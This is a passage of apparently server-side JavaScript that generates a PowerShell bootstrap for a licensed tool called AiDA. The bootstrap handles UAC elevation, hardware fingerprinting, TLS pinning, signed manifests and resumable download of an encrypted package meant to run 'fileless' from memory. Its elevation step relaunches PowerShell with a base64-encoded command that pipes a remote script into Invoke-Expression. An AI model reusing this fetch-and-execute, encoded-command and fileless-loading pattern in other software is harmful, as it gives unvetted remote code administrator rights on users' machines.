    const tlsSpki = validHexSha256(tlsSpkiRaw) ? tlsSpkiRaw : '';
    const tlsCert = validHexSha256(tlsCertRaw) ? tlsCertRaw : '';
    const requireTlsPin = (process.env.AIDA_BOOTSTRAP_REQUIRE_TLS_PIN || (process.env.NODE_ENV === 'production' ? '1' : '0')) !== '0';
    const release = getReleaseConfig();
    const signerThumbprint = release.ok ? release.signer_thumbprint : String(process.env.AIDA_BOOTSTRAP_SIGNER_THUMBPRINT || '').replace(/\s+/g, '').toUpperCase();
    const acceptPrivateCa = release.ok ? release.accept_pinned_private_ca_signer : process.env.AIDA_BOOTSTRAP_ACCEPT_PINNED_PRIVATE_CA_SIGNER === '1';
    let p256 = { x: '', y: '' };
    try {
        p256 = getBootstrapP256PublicHex();
    } catch (_) { }
    const lines = [
        '$ErrorActionPreference = "Stop"',
        '$AidaBootstrapSelfUrl = ' + psQuote(origin),
        '$AidaBootstrapLogPath = Join-Path ([IO.Path]::GetTempPath()) "aida_bootstrap.log"',
        'function Write-AidaBootstrapLog([string]$Message) { try { $line = "[{0:O}] pid={1} tid={2} {3}{4}" -f [DateTimeOffset]::UtcNow, $PID, [System.Threading.Thread]::CurrentThread.ManagedThreadId, $Message, [Environment]::NewLine; [IO.File]::AppendAllText($script:AidaBootstrapLogPath, $line, [Text.Encoding]::UTF8) } catch { } }',
        'try { $logDir = [IO.Path]::GetDirectoryName($AidaBootstrapLogPath); if ($logDir -and -not [IO.Directory]::Exists($logDir)) { [IO.Directory]::CreateDirectory($logDir) | Out-Null }; [IO.File]::WriteAllText($AidaBootstrapLogPath, ("AiDA bootstrap log started {0:O} pid={1} powershell={2}{3}" -f [DateTimeOffset]::UtcNow, $PID, $PSVersionTable.PSVersion.ToString(), [Environment]::NewLine), [Text.Encoding]::UTF8) } catch { }',
        '$script:AidaBootstrapStartUtc = [DateTimeOffset]::UtcNow',
        'try { Write-AidaBootstrapLog ("script_entry exe=" + [Diagnostics.Process]::GetCurrentProcess().MainModule.FileName) } catch { Write-AidaBootstrapLog "script_entry" }',
        'Write-AidaBootstrapLog "direct_log_ready"',
        'function Test-AidaIsAdministrator { try { return ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) } catch { return $false } }',
        'function Invoke-AidaElevatedBootstrap { $ps = Join-Path $env:SystemRoot "System32\\WindowsPowerShell\\v1.0\\powershell.exe"; if (-not [IO.File]::Exists($ps)) { $ps = "powershell.exe" }; $cmd = "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { }; Invoke-RestMethod -Uri `"$AidaBootstrapSelfUrl`" | Invoke-Expression"; $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd)); try { Start-Process -FilePath $ps -Verb RunAs -WindowStyle Normal -ArgumentList @("-NoLogo","-NoProfile","-NoExit","-EncodedCommand",$encoded) | Out-Null; Write-AidaBootstrapLog "elevation_requested"; Write-Host "AiDA requested an elevated PowerShell window through UAC. Continue in the administrator window." -ForegroundColor Cyan; $global:LASTEXITCODE = 0 } catch { Write-AidaBootstrapLog ("elevation_failed " + $_.Exception.GetType().FullName + ": " + $_.Exception.Message); Write-Host ("AiDA bootstrap requires administrator approval: " + $_.Exception.Message) -ForegroundColor Red; try { Read-Host "Press Enter to close" | Out-Null } catch { }; $global:LASTEXITCODE = 1 } }',
        'if (-not (Test-AidaIsAdministrator)) { Invoke-AidaElevatedBootstrap; return }',
        'if ($PSVersionTable.PSEdition -and $PSVersionTable.PSEdition -ne "Desktop") { Write-AidaBootstrapLog ("unsupported_powershell_edition=" + $PSVersionTable.PSEdition); throw "AiDA bootstrap requires Windows PowerShell 5.1. Run it from powershell.exe, not pwsh." }',
        'if ($PSVersionTable.PSVersion.Major -lt 5) { Write-AidaBootstrapLog ("unsupported_powershell_version=" + $PSVersionTable.PSVersion.ToString()); throw "AiDA bootstrap requires Windows PowerShell 5.1 or newer." }',
        '$ProgressPreference = "Continue"',
        '$AidaBootstrapServer = ' + psQuote(origin),
        '$AidaPinnedSpkiSha256 = ' + psQuote(tlsSpki),
        '$AidaPinnedCertSha256 = ' + psQuote(tlsCert),
        '$AidaRequireTlsPin = $' + (requireTlsPin ? 'true' : 'false'),
        '$AidaMaxPackageBytes = ' + String(MAX_PACKAGE_BYTES),
        '$AidaMaxSidecarBytes = ' + String(MAX_CAMOUFOX_SIDECAR_BYTES),
        '$AidaManifestP256X = ' + psQuote(p256.x),
        '$AidaManifestP256Y = ' + psQuote(p256.y),
        'function Write-AidaStatus([string]$Message) { Write-AidaBootstrapLog ("status " + $Message); Write-Host ("[{0}] {1}" -f (Get-Date -Format "HH:mm:ss"), $Message) -ForegroundColor Cyan }',
        'function Set-AidaProcessEnvValue([string]$Name,$Value) { [Environment]::SetEnvironmentVariable($Name, $Value, "Process"); if ($null -eq $Value) { Remove-Item -Path ("Env:\\" + $Name) -ErrorAction SilentlyContinue } else { Set-Item -Path ("Env:\\" + $Name) -Value $Value } }',
        'function Get-AidaDesktopDirectory { $d = [Environment]::GetFolderPath("DesktopDirectory"); if (-not $d) { $up = [Environment]::GetEnvironmentVariable("USERPROFILE"); if ($up) { $d = Join-Path $up "Desktop" } }; if (-not $d) { throw "AiDA fileless debug log desktop path is unavailable." }; if (-not [IO.Directory]::Exists($d)) { [IO.Directory]::CreateDirectory($d) | Out-Null }; return $d }',
        'function Initialize-AidaFilelessDebugLog([string]$ArtifactHash,[int64]$ImageBytes) { $dir = Get-AidaDesktopDirectory; $path = Join-Path $dir "aida_debug_fileless.log"; $hostExe = ""; try { $hostExe = [Diagnostics.Process]::GetCurrentProcess().MainModule.FileName } catch { }; $prefix = ""; if ($ArtifactHash) { $prefix = $ArtifactHash.Substring(0, [Math]::Min(16, $ArtifactHash.Length)) }; $line = "AiDA fileless debug log started {0:O} pid={1} tid={2} host_exe={3} bootstrap_log={4} image_bytes={5} artifact_sha256_prefix={6} no_disk_write=1{7}" -f [DateTimeOffset]::UtcNow, $PID, [System.Threading.Thread]::CurrentThread.ManagedThreadId, $hostExe, $AidaBootstrapLogPath, $ImageBytes, $prefix, [Environment]::NewLine; [IO.File]::WriteAllText($path, $line, [Text.Encoding]::UTF8); Write-AidaBootstrapLog ("fileless_debug_log_ready path=" + $path + " bytes=" + $ImageBytes); return $path }',
        'function Test-AidaNoStandaloneDiskArtifact([string]$Stage,[int64]$ExpectedSize) { $roots = @([IO.Path]::GetTempPath(), [Environment]::CurrentDirectory, (Get-AidaDesktopDirectory)) | Where-Object { $_ } | Select-Object -Unique; $cutoff = $script:AidaBootstrapStartUtc.UtcDateTime.AddSeconds(-2); $checked = 0; foreach ($root in $roots) { if (-not [IO.Directory]::Exists($root)) { continue }; foreach ($candidate in [IO.Directory]::EnumerateFiles($root, "AiDAStandalone.exe", [IO.SearchOption]::TopDirectoryOnly)) { $checked++; $fi = New-Object IO.FileInfo($candidate); $fresh = ($fi.LastWriteTimeUtc -ge $cutoff -or $fi.CreationTimeUtc -ge $cutoff); $sizeMatch = ($ExpectedSize -le 0 -or $fi.Length -eq $ExpectedSize); if ($fresh -and $sizeMatch) { Write-AidaBootstrapLog ("no_disk_write_validation_failed stage={0} path={1} len={2} last_write={3:O}" -f $Stage,$candidate,$fi.Length,$fi.LastWriteTimeUtc); throw "AiDA fileless no-disk-write validation failed." } } }; Write-AidaBootstrapLog ("no_disk_write_validation stage={0} checked={1} expected_size={2} fresh_matches=0" -f $Stage,$checked,$ExpectedSize) }',
        'function ConvertTo-AidaHex([byte[]]$Bytes) { -join ($Bytes | ForEach-Object { $_.ToString("x2") }) }',
        'function ConvertFrom-AidaHex([string]$Hex) { if (-not $Hex -or ($Hex.Length % 2) -ne 0 -or $Hex -notmatch "^[0-9a-fA-F]+$") { throw "AiDA invalid hex value." }; $b = New-Object byte[] ($Hex.Length / 2); for ($i = 0; $i -lt $b.Length; $i++) { $b[$i] = [Convert]::ToByte($Hex.Substring($i * 2, 2), 16) }; $b }',
        'function Test-AidaBytesEqual([byte[]]$A, [byte[]]$B) { if ($null -eq $A -or $null -eq $B -or $A.Length -ne $B.Length) { return $false }; $d = 0; for ($i = 0; $i -lt $A.Length; $i++) { $d = $d -bor ($A[$i] -bxor $B[$i]) }; return $d -eq 0 }',
        'function Test-AidaHexEqual([string]$A, [string]$B) { try { $ab = ConvertFrom-AidaHex $A; $bb = ConvertFrom-AidaHex $B; Test-AidaBytesEqual $ab $bb } catch { $false } }',
        'function New-AidaNonce { $b = New-Object byte[] 32; $rng = [Security.Cryptography.RandomNumberGenerator]::Create(); try { $rng.GetBytes($b); ConvertTo-AidaHex $b } finally { $rng.Dispose() } }',
        'function Get-AidaUtf8Bytes([string]$Text) { if ($null -eq $Text) { $Text = "" }; [Text.Encoding]::UTF8.GetBytes($Text) }',
        'function Normalize-AidaWhitespace([string]$Text) { if ($null -eq $Text) { return "" }; return ($Text.Trim() -replace "\\s+", " ") }',
        'function Normalize-AidaUpperWhitespace([string]$Text) { $v = Normalize-AidaWhitespace $Text; if (-not $v) { return "" }; return $v.ToUpperInvariant() }',
        'function Normalize-AidaSerial([string]$Text) { if ($null -eq $Text) { return "" }; $v = $Text.Trim(); if (-not $v) { return "" }; return $v.ToUpperInvariant() }',
        'function Normalize-AidaMac([string]$Text) { if ($null -eq $Text) { return "" }; $v = (($Text.ToString()) -replace "[^0-9A-Fa-f]", "").ToUpperInvariant(); if ($v.Length -lt 12) { return "" }; $v = $v.Substring(0, 12); if ($v -match "^(0{12}|F{12})$") { return "" }; return $v }',
        'function Get-AidaRegistryString([string]$SubKey,[string]$Name) { $base = $null; $key = $null; try { $base = [Microsoft.Win32.RegistryKey]::OpenBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine, [Microsoft.Win32.RegistryView]::Registry64); $key = $base.OpenSubKey($SubKey); if (-not $key) { return "" }; $v = $key.GetValue($Name, ""); if ($null -eq $v) { return "" }; return [string]$v } catch { return "" } finally { if ($key) { $key.Dispose() }; if ($base) { $base.Dispose() } } }',
        'function Get-AidaCimItems([string]$Class,[string]$Filter) { try { if ($Filter) { return @(Get-CimInstance -ClassName $Class -Filter $Filter -ErrorAction Stop) }; return @(Get-CimInstance -ClassName $Class -ErrorAction Stop) } catch { try { if ($Filter) { return @(Get-WmiObject -Class $Class -Filter $Filter -ErrorAction Stop) }; return @(Get-WmiObject -Class $Class -ErrorAction Stop) } catch { return @() } } }',
        'function Get-AidaFirstCimValue([string]$Class,[string]$Property,[string]$Filter) { foreach ($item in (Get-AidaCimItems $Class $Filter)) { try { $v = $item.$Property; if ($null -ne $v) { $s = [string]$v; if ($s.Trim()) { return $s } } } catch { } }; return "" }',
        'function Get-AidaSmbiosUuidFactor { $u = (Get-AidaFirstCimValue "Win32_ComputerSystemProduct" "UUID" "").Trim(); if ($u -notmatch "^[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{12}$") { return "" }; $h = $u -replace "-", ""; if ($h -match "^(0{32}|F{32}|f{32})$") { return "" }; return $u.ToLowerInvariant() }',
        'function Get-AidaBaseboardSerialFactor { Normalize-AidaSerial (Get-AidaFirstCimValue "Win32_BaseBoard" "SerialNumber" "") }',
        'function Get-AidaChassisSerialFactor { $v = Get-AidaFirstCimValue "Win32_SystemEnclosure" "SerialNumber" ""; Normalize-AidaSerial $v }',
        'function Get-AidaDiskSerialFactor { $items = Get-AidaCimItems "Win32_DiskDrive" ""; $disk = $items | Where-Object { try { [int]$_.Index -eq 0 } catch { $false } } | Select-Object -First 1; if (-not $disk) { $disk = $items | Select-Object -First 1 }; if (-not $disk) { return "" }; Normalize-AidaSerial ([string]$disk.SerialNumber) }',
        'function Get-AidaMacFactor { $candidates = New-Object System.Collections.ArrayList; try { foreach ($a in @(Get-NetAdapter -ErrorAction Stop)) { $desc = [string]$a.InterfaceDescription; if ($desc -match "Loopback|Tunnel") { continue }; $p = Normalize-AidaMac ([string]$a.PermanentAddress); if ($p) { [void]$candidates.Add([pscustomobject]@{ value = $p; permanent = $true }) }; $m = Normalize-AidaMac ([string]$a.MacAddress); if ($m) { [void]$candidates.Add([pscustomobject]@{ value = $m; permanent = $false }) } } } catch { }; if ($candidates.Count -eq 0) { foreach ($a in (Get-AidaCimItems "Win32_NetworkAdapter" "MACAddress IS NOT NULL")) { $kind = [string]$a.AdapterType; if ($kind -match "Loopback|Tunnel") { continue }; $m = Normalize-AidaMac ([string]$a.MACAddress); if ($m) { [void]$candidates.Add([pscustomobject]@{ value = $m; permanent = $false }) } } }; if ($candidates.Count -eq 0) { return "" }; $selected = $candidates | Sort-Object -Property @{ Expression = { if ($_.permanent) { 0 } else { 1 } } }, value -Unique | Select-Object -First 1; return [string]$selected.value }',
        'function Get-AidaCpuBrandFactor { Normalize-AidaUpperWhitespace (Get-AidaFirstCimValue "Win32_Processor" "Name" "") }',
        'function Get-AidaMachineGuidFactor { $v = Normalize-AidaWhitespace (Get-AidaRegistryString "SOFTWARE\\Microsoft\\Cryptography" "MachineGuid"); if (-not $v) { return "" }; return $v.ToLowerInvariant() }',
        'function Get-AidaInstallationGuidFactor { $v = Get-AidaRegistryString "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" "InstallationGUID"; if (-not $v) { $v = Get-AidaRegistryString "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" "InstallationID" }; if (-not $v) { $v = Get-AidaRegistryString "SOFTWARE\\Microsoft\\Windows\\CurrentVersion" "InstallationID" }; $v = Normalize-AidaWhitespace $v; if (-not $v) { return "" }; return $v.ToLowerInvariant() }',
        'function Add-AidaHwidBytes([System.Collections.Generic.List[byte]]$Buffer,[byte[]]$Bytes) { if ($null -eq $Bytes) { $Bytes = New-Object byte[] 0 }; $len = [Math]::Min([int]$Bytes.Length, 65535); $Buffer.Add([byte]($len -band 255)); $Buffer.Add([byte](($len -shr 8) -band 255)); for ($i = 0; $i -lt $len; $i++) { $Buffer.Add($Bytes[$i]) } }',
        'function Get-AidaBootstrapHwid { $factors = @((Get-AidaSmbiosUuidFactor), (Get-AidaBaseboardSerialFactor), (Get-AidaChassisSerialFactor), (Get-AidaDiskSerialFactor), (Get-AidaMacFactor), (Get-AidaCpuBrandFactor), (Get-AidaMachineGuidFactor), (Get-AidaInstallationGuidFactor), "no_tpm"); $collected = 0; foreach ($f in $factors) { if ($f) { $collected++ } }; if ($collected -lt 5) { throw "AiDA bootstrap HWID collection failed." }; $buf = New-Object "System.Collections.Generic.List[byte]"; $buf.AddRange([byte[]](2,0,0,0)); foreach ($f in $factors) { Add-AidaHwidBytes $buf (Get-AidaUtf8Bytes ([string]$f)) }; $sha = [Security.Cryptography.SHA256]::Create(); try { $bytes = $buf.ToArray(); $hwid = ConvertTo-AidaHex ($sha.ComputeHash($bytes)); if (-not $hwid -or $hwid -notmatch "^[0-9a-f]{64}$") { throw "AiDA bootstrap HWID hash is invalid." }; return $hwid } finally { if ($sha) { $sha.Dispose() }; if ($bytes) { [Array]::Clear($bytes, 0, $bytes.Length) } } }',
        'function Get-AidaSecureText([string]$Prompt) { $s = Read-Host $Prompt -AsSecureString; $p = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($s); try { [Runtime.InteropServices.Marshal]::PtrToStringBSTR($p) } finally { if ($p -ne [IntPtr]::Zero) { [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($p) } } }',
        'function Get-AidaTlsHashes([string]$Target) { $u = [Uri]$Target; $tcp = New-Object Net.Sockets.TcpClient; $tcp.Connect($u.Host, $(if ($u.Port -gt 0) { $u.Port } else { 443 })); try { $ssl = New-Object Net.Security.SslStream($tcp.GetStream(), $false, { param($sender,$cert,$chain,$errors) return ($errors -eq [Net.Security.SslPolicyErrors]::None) }); $ssl.AuthenticateAsClient($u.Host); $cert2 = New-Object Security.Cryptography.X509Certificates.X509Certificate2($ssl.RemoteCertificate); $sha = [Security.Cryptography.SHA256]::Create(); try { $certHash = ConvertTo-AidaHex ($sha.ComputeHash($cert2.RawData)); $spkiHash = ""; try { $rsa = [Security.Cryptography.X509Certificates.RSACertificateExtensions]::GetRSAPublicKey($cert2); if ($rsa -and $rsa.GetType().GetMethod("ExportSubjectPublicKeyInfo")) { $spkiHash = ConvertTo-AidaHex ($sha.ComputeHash($rsa.ExportSubjectPublicKeyInfo())) } } catch { } try { if (-not $spkiHash) { $ecdsa = [Security.Cryptography.X509Certificates.ECDsaCertificateExtensions]::GetECDsaPublicKey($cert2); if ($ecdsa -and $ecdsa.GetType().GetMethod("ExportSubjectPublicKeyInfo")) { $spkiHash = ConvertTo-AidaHex ($sha.ComputeHash($ecdsa.ExportSubjectPublicKeyInfo())) } } } catch { } if(-not $spkiHash){try{$pk=$cert2.PublicKey;$od=$pk.Oid.Value;$ob=if($od-eq"1.2.840.10045.2.1"){[byte[]]@(6,7,42,134,72,206,61,2,1)}elseif($od-eq"1.2.840.113549.1.1.1"){[byte[]]@(6,9,42,134,72,134,247,13,1,1,1)}else{$null};if($ob){$dl={param($n)if($n-lt128){[byte[]]@($n)}elseif($n-le255){[byte[]]@(129,$n)}else{[byte[]]@(130,($n-shr8),($n-band255))}};$ap=[byte[]]$pk.EncodedParameters.RawData;$kb=[byte[]]$pk.EncodedKeyValue.RawData;$ai=$ob+$ap;$as=[byte[]]@(48)+(& $dl $ai.Length)+$ai;$bs=[byte[]]@(3)+(& $dl (1+$kb.Length))+[byte[]]@(0)+$kb;$si=[byte[]]($as+$bs);$sb=[byte[]]@(48)+(& $dl $si.Length)+$si;$spkiHash=ConvertTo-AidaHex($sha.ComputeHash($sb))}}catch{}} [pscustomobject]@{ cert_sha256 = $certHash; spki_sha256 = $spkiHash } } finally { $sha.Dispose(); $cert2.Dispose(); $ssl.Dispose() } } finally { $tcp.Dispose() } }',
        'function Assert-AidaTlsPin { if (-not $AidaPinnedSpkiSha256 -and -not $AidaPinnedCertSha256) { if ($AidaRequireTlsPin) { throw "AiDA bootstrap TLS pin is not configured." }; return }; $h = Get-AidaTlsHashes $AidaBootstrapServer; if ($AidaPinnedSpkiSha256 -and $h.spki_sha256 -and ($h.spki_sha256.ToLowerInvariant() -eq $AidaPinnedSpkiSha256.ToLowerInvariant())) { return }; if ($AidaPinnedCertSha256 -and ($h.cert_sha256.ToLowerInvariant() -eq $AidaPinnedCertSha256.ToLowerInvariant())) { return }; throw "AiDA bootstrap TLS pin verification failed." }',
        'function Enable-AidaPinnedTls { $script:AidaPinnedHost = ([Uri]$AidaBootstrapServer).Host; [Net.ServicePointManager]::ServerCertificateValidationCallback = { param($sender,$cert,$chain,$errors) try { if ($errors -ne [Net.Security.SslPolicyErrors]::None) { return $false }; $cert2 = New-Object Security.Cryptography.X509Certificates.X509Certificate2($cert); $sha = [Security.Cryptography.SHA256]::Create(); try { $certHash = ConvertTo-AidaHex ($sha.ComputeHash($cert2.RawData)); if ($AidaPinnedCertSha256 -and ($certHash.ToLowerInvariant() -eq $AidaPinnedCertSha256.ToLowerInvariant())) { return $true }; if ($AidaPinnedSpkiSha256) { $spkiHash = ""; try { $rsa = [Security.Cryptography.X509Certificates.RSACertificateExtensions]::GetRSAPublicKey($cert2); if ($rsa -and $rsa.GetType().GetMethod("ExportSubjectPublicKeyInfo")) { $spkiHash = ConvertTo-AidaHex ($sha.ComputeHash($rsa.ExportSubjectPublicKeyInfo())) } } catch { }; try { if (-not $spkiHash) { $ecdsa = [Security.Cryptography.X509Certificates.ECDsaCertificateExtensions]::GetECDsaPublicKey($cert2); if ($ecdsa -and $ecdsa.GetType().GetMethod("ExportSubjectPublicKeyInfo")) { $spkiHash = ConvertTo-AidaHex ($sha.ComputeHash($ecdsa.ExportSubjectPublicKeyInfo())) } } } catch { }; if(-not $spkiHash){try{$pk=$cert2.PublicKey;$od=$pk.Oid.Value;$ob=if($od-eq"1.2.840.10045.2.1"){[byte[]]@(6,7,42,134,72,206,61,2,1)}elseif($od-eq"1.2.840.113549.1.1.1"){[byte[]]@(6,9,42,134,72,134,247,13,1,1,1)}else{$null};if($ob){$dl={param($n)if($n-lt128){[byte[]]@($n)}elseif($n-le255){[byte[]]@(129,$n)}else{[byte[]]@(130,($n-shr8),($n-band255))}};$ap=[byte[]]$pk.EncodedParameters.RawData;$kb=[byte[]]$pk.EncodedKeyValue.RawData;$ai=$ob+$ap;$as=[byte[]]@(48)+(& $dl $ai.Length)+$ai;$bs=[byte[]]@(3)+(& $dl (1+$kb.Length))+[byte[]]@(0)+$kb;$si=[byte[]]($as+$bs);$sb=[byte[]]@(48)+(& $dl $si.Length)+$si;$spkiHash=ConvertTo-AidaHex($sha.ComputeHash($sb))}}catch{}}; if ($spkiHash -and ($spkiHash.ToLowerInvariant() -eq $AidaPinnedSpkiSha256.ToLowerInvariant())) { return $true } }; return (-not $AidaRequireTlsPin -and -not $AidaPinnedCertSha256 -and -not $AidaPinnedSpkiSha256) } finally { $sha.Dispose(); $cert2.Dispose() } } catch { return $false } } }',
        'function Invoke-AidaJson([string]$Path, [object]$Body) { $json = $null; $bytes = $null; $req = $null; $resp = $null; $rs = $null; try { Write-AidaBootstrapLog ("http_post path=" + $Path); $json = $Body | ConvertTo-Json -Depth 8 -Compress; $bytes = [Text.Encoding]::UTF8.GetBytes($json); $req = [Net.HttpWebRequest]::Create($AidaBootstrapServer + $Path); $req.Method = "POST"; $req.UserAgent = "AiDA Bootstrap"; $req.ContentType = "application/json"; $req.AllowAutoRedirect = $false; $req.Timeout = 60000; $req.ReadWriteTimeout = 60000; $req.ContentLength = $bytes.Length; $rs = $req.GetRequestStream(); try { $rs.Write($bytes, 0, $bytes.Length) } finally { if ($rs) { $rs.Dispose(); $rs = $null } }; try { $resp = $req.GetResponse() } catch [Net.WebException] { $status = 0; $wresp = $_.Exception.Response; try { if ($wresp) { $status = [int]$wresp.StatusCode } } finally { if ($wresp) { $wresp.Dispose() } }; Write-AidaBootstrapLog ("http_response_error path=" + $Path + " status=" + $status); if ($Path -eq "/api/bootstrap/authorize" -and ($status -eq 401 -or $status -eq 403)) { throw "AiDA bootstrap authorization failed. Verify the license key and machine binding." }; throw "AiDA bootstrap API request failed." }; Write-AidaBootstrapLog ("http_response path=" + $Path + " status=" + [int]$resp.StatusCode); if ([int]$resp.StatusCode -ne 200) { throw "AiDA bootstrap API request failed." }; $reader = New-Object IO.StreamReader($resp.GetResponseStream(), [Text.Encoding]::UTF8); try { $text = $reader.ReadToEnd(); $text | ConvertFrom-Json } finally { $reader.Dispose(); $text = $null } } catch { Write-AidaBootstrapLog ("http_error path=" + $Path + " error=" + $_.Exception.GetType().FullName + ": " + $_.Exception.Message); throw } finally { if ($resp) { $resp.Dispose() }; if ($bytes) { [Array]::Clear($bytes, 0, $bytes.Length) }; $json = $null } }',
        'function Get-AidaTokenId([string]$Token) { $m = [regex]::Match($Token, "^AIDABOOT\\.v1\\.([0-9a-fA-F]{32})\\.([0-9a-fA-F]{64})$"); if (-not $m.Success) { throw "AiDA bootstrap token format is invalid." }; $m.Groups[1].Value.ToLowerInvariant() }',
        'function Get-AidaTokenSecretBytes([string]$Token) { $m = [regex]::Match($Token, "^AIDABOOT\\.v1\\.([0-9a-fA-F]{32})\\.([0-9a-fA-F]{64})$"); if (-not $m.Success) { throw "AiDA bootstrap token format is invalid." }; ConvertFrom-AidaHex $m.Groups[2].Value }',
        'function Get-AidaTokenParts([string]$Token) { $m = [regex]::Match($Token, "^AIDABOOT\\.v1\\.([0-9a-fA-F]{32})\\.([0-9a-fA-F]{64})$"); if (-not $m.Success) { throw "AiDA bootstrap token format is invalid." }; [pscustomobject]@{ id = $m.Groups[1].Value.ToLowerInvariant(); secret = $m.Groups[2].Value.ToLowerInvariant() } }',
        'function Get-AidaManifestMacInput([object]$M) { @("AIDABOOTMANIFEST.v1", [string]$M.token_id, [string]$M.issued_at, [string]$M.expires_at, [string]$M.artifact.name, [string]$M.artifact.version, [string]$M.artifact.url, [string]$M.artifact.sha256, [string]$M.artifact.size, [string]$M.artifact.package.format, [string]$M.artifact.package.sha256, [string]$M.artifact.package.size, [string]$M.artifact.package.enc_key_b64, [string]$M.artifact.package.mac_key_b64, $(if ($M.artifact.authenticode.required) { "1" } else { "0" }), [string]$M.artifact.authenticode.signer_thumbprint, $(if ($M.artifact.authenticode.accept_pinned_private_ca) { "1" } else { "0" }), $(if ($M.camoufox.configured) { "1" } else { "0" }), [string]$M.camoufox.version, [string]$M.camoufox.url, [string]$M.camoufox.sha256, [string]$M.camoufox.size, [string]$M.camoufox.executable_rel, [string]$M.camoufox.python_rel, $(if ($M.camoufox.mcp.configured) { "1" } else { "0" }), [string]$M.camoufox.mcp.version, [string]$M.camoufox.mcp.url, [string]$M.camoufox.mcp.sha256, [string]$M.camoufox.mcp.size, [string]$M.camoufox.mcp.rel, $(if ($M.policy.one_time_token) { "1" } else { "0" }), $(if ($M.policy.token_bound_to_client_nonce) { "1" } else { "0" }), $(if ($M.policy.token_bound_to_source_ip) { "1" } else { "0" }), $(if ($M.policy.artifact_https_required) { "1" } else { "0" }), $(if ($M.policy.no_public_binary_route) { "1" } else { "0" }), $(if ($M.policy.encrypted_public_artifact) { "1" } else { "0" }), $(if ($M.policy.camoufox_sidecar_hash_required) { "1" } else { "0" }), $(if ($M.policy.camoufox_mcp_hash_required) { "1" } else { "0" })) -join "`n" }',
        'function Get-AidaHmacHex([string]$KeyHex, [string]$Data) { $key = ConvertFrom-AidaHex $KeyHex; $h = New-Object Security.Cryptography.HMACSHA256 -ArgumentList (,$key); try { ConvertTo-AidaHex ($h.ComputeHash([Text.Encoding]::UTF8.GetBytes($Data))) } finally { $h.Dispose(); [Array]::Clear($key, 0, $key.Length) } }',
        'function Get-AidaHmacHexFromBytes([byte[]]$Key, [string]$Data) { $h = New-Object Security.Cryptography.HMACSHA256 -ArgumentList (,$Key); try { ConvertTo-AidaHex ($h.ComputeHash([Text.Encoding]::UTF8.GetBytes($Data))) } finally { $h.Dispose() } }',
        'function Test-AidaP256Signature([string]$Data, [string]$SignatureHex) { if (-not $AidaManifestP256X -or -not $AidaManifestP256Y) { throw "AiDA manifest signature key is not configured." }; $x = ConvertFrom-AidaHex $AidaManifestP256X; $y = ConvertFrom-AidaHex $AidaManifestP256Y; $sig = ConvertFrom-AidaHex $SignatureHex; $blob = New-Object byte[] 72; try { if ($x.Length -ne 32 -or $y.Length -ne 32 -or $sig.Length -ne 64) { return $false }; $magic = [BitConverter]::GetBytes([uint32]0x31534345); $size = [BitConverter]::GetBytes([uint32]32); [Array]::Copy($magic, 0, $blob, 0, 4); [Array]::Copy($size, 0, $blob, 4, 4); [Array]::Copy($x, 0, $blob, 8, 32); [Array]::Copy($y, 0, $blob, 40, 32); $key = [Security.Cryptography.CngKey]::Import($blob, [Security.Cryptography.CngKeyBlobFormat]::EccPublicBlob); $ecdsa = New-Object Security.Cryptography.ECDsaCng($key); try { $ecdsa.HashAlgorithm = [Security.Cryptography.CngAlgorithm]::Sha256; $ecdsa.VerifyData([Text.Encoding]::UTF8.GetBytes($Data), $sig) } finally { $ecdsa.Dispose(); $key.Dispose() } } catch { $false } finally { [Array]::Clear($x, 0, $x.Length); [Array]::Clear($y, 0, $y.Length); [Array]::Clear($sig, 0, $sig.Length); [Array]::Clear($blob, 0, $blob.Length) } }',
        'function Get-AidaPackageBytesWithProgress([Uri]$Uri, [long]$ExpectedSize, [string]$ExpectedSha256) {',
        '    Write-AidaBootstrapLog ("package_download_start host=" + $Uri.Host + " expected_size=" + $ExpectedSize)',
        '    if ($ExpectedSize -le 0 -or $ExpectedSize -gt $AidaMaxPackageBytes -or $ExpectedSize -gt [int]::MaxValue) { throw "AiDA package size is not allowed." }',
        '    if (-not $ExpectedSha256 -or $ExpectedSha256 -notmatch "^[0-9a-fA-F]{64}$") { throw "AiDA encrypted package SHA-256 metadata is invalid." }',
        '    $buf = New-Object byte[] 1048576; $data = New-Object byte[] ([int]$ExpectedSize); $done = [int64]0; $progressNext = [int64]0; $sw = [Diagnostics.Stopwatch]::StartNew(); $attempt = 0; $maxAttempts = 10',
        '    try {',
        '        while ($done -lt $ExpectedSize) {',
        '            $attempt++',
        '            $req = $null; $resp = $null; $stream = $null; $before = $done',
        '            try {',
        '                $req = [Net.HttpWebRequest]::Create($Uri.AbsoluteUri)',
        '                $req.Method = "GET"',
        '                $req.UserAgent = "AiDA Bootstrap"',
        '                $req.AllowAutoRedirect = $false',
        '                $req.Timeout = 900000',
        '                $req.ReadWriteTimeout = 900000',
        '                try { $req.AllowReadStreamBuffering = $false } catch { }',
        '                if ($done -gt 0) { try { $req.AddRange([int64]$done) } catch { $req.Headers["Range"] = ("bytes={0}-" -f $done) } }',
        '                Write-AidaBootstrapLog ("package_download_attempt attempt={0} offset={1}" -f $attempt,$done)',
        '                $resp = $req.GetResponse()',
        '                $status = [int]$resp.StatusCode',
        '                Write-AidaBootstrapLog ("package_download_response attempt={0} status={1} content_length={2} range={3}" -f $attempt,$status,$resp.ContentLength,$resp.Headers["Content-Range"])',
        '                if ($done -eq 0) { if ($status -ne 200 -and $status -ne 206) { throw "AiDA package download failed." }; if ($status -eq 200 -and $resp.ContentLength -ge 0 -and [int64]$resp.ContentLength -ne $ExpectedSize) { throw "AiDA package size mismatch." } }',
        '                else { if ($status -eq 200) { Write-AidaBootstrapLog ("package_download_range_unsupported_restart attempt={0} old_offset={1}" -f $attempt,$done); $done = 0; $before = 0; $progressNext = 0 } elseif ($status -ne 206) { throw "AiDA package resume failed." } }',
        '                $stream = $resp.GetResponseStream()',
        '                while (($read = $stream.Read($buf, 0, $buf.Length)) -gt 0) {',
